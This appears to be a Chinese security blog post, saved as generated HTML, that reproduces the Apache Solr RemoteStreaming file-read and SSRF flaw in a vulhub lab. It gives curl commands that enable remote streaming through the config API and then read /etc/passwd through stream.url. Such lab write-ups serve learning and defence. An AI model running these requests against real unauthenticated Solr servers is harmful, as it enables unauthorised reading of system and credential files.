@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"eryao7.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="漏洞描述Apache Solr 是一个开源的搜索服务器。在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或任意文件读取。 影响范围Apache Solr &lt;&#x3D; 8.8.1 复现过程漏洞环境vulhub搭建：https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;solr&#x2F;Remote-Streaming-F">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulhub漏洞-Apache_Solr_RemoteStreaming文件读取与SSRF漏洞">
+<meta property="og:url" content="http://eryao7.github.io/2021/12/17/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94Apache-Solr-RemoteStreaming%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="ErYao7">
+<meta property="og:description" content="漏洞描述Apache Solr 是一个开源的搜索服务器。在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或任意文件读取。 影响范围Apache Solr &lt;&#x3D; 8.8.1 复现过程漏洞环境vulhub搭建：https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;solr&#x2F;Remote-Streaming-F">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112171443322.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112171448280.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112171450844.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112171455953.png">
+<meta property="article:published_time" content="2021-12-17T06:33:31.000Z">
+<meta property="article:modified_time" content="2021-12-17T07:07:13.480Z">
+<meta property="article:author" content="ErYao7">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112171443322.png">
+
+
+<link rel="canonical" href="http://eryao7.github.io/2021/12/17/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94Apache-Solr-RemoteStreaming%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://eryao7.github.io/2021/12/17/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94Apache-Solr-RemoteStreaming%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E/","path":"2021/12/17/vulhub漏洞—Apache-Solr-RemoteStreaming文件读取与SSRF漏洞/","title":"vulhub漏洞-Apache_Solr_RemoteStreaming文件读取与SSRF漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulhub漏洞-Apache_Solr_RemoteStreaming文件读取与SSRF漏洞 | ErYao7</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?c92ad4f568c8e98b7c047d3479b8585b"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="ErYao7" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">ErYao7</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-text">复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="nav-text">漏洞环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-1"><span class="nav-text">复现过程</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ErYao7"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">ErYao7</p>
+  <div class="site-description" itemprop="description">欢迎来到ErYao7的博客~</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://eryao7.github.io/2021/12/17/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94Apache-Solr-RemoteStreaming%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ErYao7">
+      <meta itemprop="description" content="欢迎来到ErYao7的博客~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ErYao7">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulhub漏洞-Apache_Solr_RemoteStreaming文件读取与SSRF漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-12-17 14:33:31 / 修改时间：15:07:13" itemprop="dateCreated datePublished" datetime="2021-12-17T14:33:31+08:00">2021-12-17</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Solr 是一个开源的搜索服务器。在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或任意文件读取。</p>
+<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Apache Solr &lt;= 8.8.1</p>
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>vulhub搭建：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/solr/Remote-Streaming-Fileread/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/solr/Remote-Streaming-Fileread/README.zh-cn.md</a></p>
+<p>执行如下命令启动solr 8.8.1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>环境启动后，访问<code>http://your-ip:8983</code>即可查看Apache Solr后台。</p>
+<span id="more"></span>
+
+<h2 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h2><p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171443322.png" alt="image-20211217144348178"></p>
+<p>访问，获取core</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171448280.png" alt="image-20211217144835223"></p>
+<p>我们这里core为demo，命令行发送</p>
+<p>发送如下数据包，修改数据库demo的配置，开启RemoteStreaming：</p>
+<p><code>curl -i -s -k -X  $&#39;POST&#39;  \</code><br>    <code>-H $&#39;Content-Type: application/json&#39;</code> </p>
+<p>​    <code>--data-binary $&#39;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125; \</code> </p>
+<p>​    <code>$&#39;http://ip:8983/solr/demo/config&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171450844.png" alt="image-20211217145016779"></p>
+<p>读取任意文件</p>
+<p><code>curl -i -s -k &#39;http://ip:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171455953.png" alt="image-20211217145546857"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/12/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E8%BF%9B%E9%98%B6%E2%80%94unserialize3/" rel="prev" title="攻防世界Web进阶—unserialize3">
+                  <i class="fa fa-chevron-left"></i> 攻防世界Web进阶—unserialize3
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/12/17/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94PHP%E7%8E%AF%E5%A2%83-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88XXE%EF%BC%89/" rel="next" title="vulhub漏洞—php环境XML外部实体注入漏洞（XXE）">
+                  vulhub漏洞—php环境XML外部实体注入漏洞（XXE） <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ErYao7</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
